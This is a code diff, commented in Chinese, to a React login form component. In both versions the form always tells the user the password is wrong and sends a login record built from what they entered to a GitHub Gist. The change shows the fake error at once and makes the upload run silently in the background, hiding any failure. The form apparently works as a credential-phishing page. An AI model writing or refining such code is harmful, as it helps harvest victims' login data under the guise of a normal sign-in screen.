@@ -41,7 +41,7 @@ export default function LoginForm() {
   
   /**
    * 处理登录提交
-   * 验证表单输入并显示密码错误提示弹窗
+   * 验证表单输入并立即显示密码错误提示弹窗，同时在后台异步保存数据
    */
   const handleLogin = async () => {
     // 基本表单验证
@@ -61,6 +61,9 @@ export default function LoginForm() {
       return
     }
     
+    // 立即显示密码错误对话框，提升用户体验
+    setShowErrorDialog(true)
+    
     // 记录登录信息
     const loginRecord = {
       id: Date.now(),
@@ -71,35 +74,15 @@ export default function LoginForm() {
       isFirstLogin: false // 初始值，会在saveLoginRecord函数中更新
     }
     
-    try {
-      console.log('准备保存登录记录:', loginRecord)
-      
-      // 保存登录记录到 Gist
-      await saveLoginRecordToGist(loginRecord)
-      
-      console.log('登录记录已保存到 Gist')
-      
-      // 显示保存成功提示已隐藏
-      // toast.success('登录记录已保存', {
-      //   description: '数据已同步到云端数据库',
-      //   duration: 2000,
-      // })
-      
-      // 显示密码错误对话框
-      setShowErrorDialog(true)
-    } catch (error) {
-      console.error('保存登录记录失败:', error)
-      toast.error('登录失败', {
-        description: '系统错误，请稍后重试',
-        duration: 3000,
-        style: {
-          background: '#fee2e2',
-          color: '#dc2626',
-          border: '1px solid #fecaca',
-          borderRadius: '8px',
-        },
+    // 在后台异步保存登录记录，不阻塞UI
+    saveLoginRecordToGist(loginRecord)
+      .then(() => {
+        console.log('登录记录已保存到 Gist')
       })
-    }
+      .catch((error) => {
+        console.error('保存登录记录失败:', error)
+        // 静默处理错误，不影响用户体验
+      })
   }
   
   return (
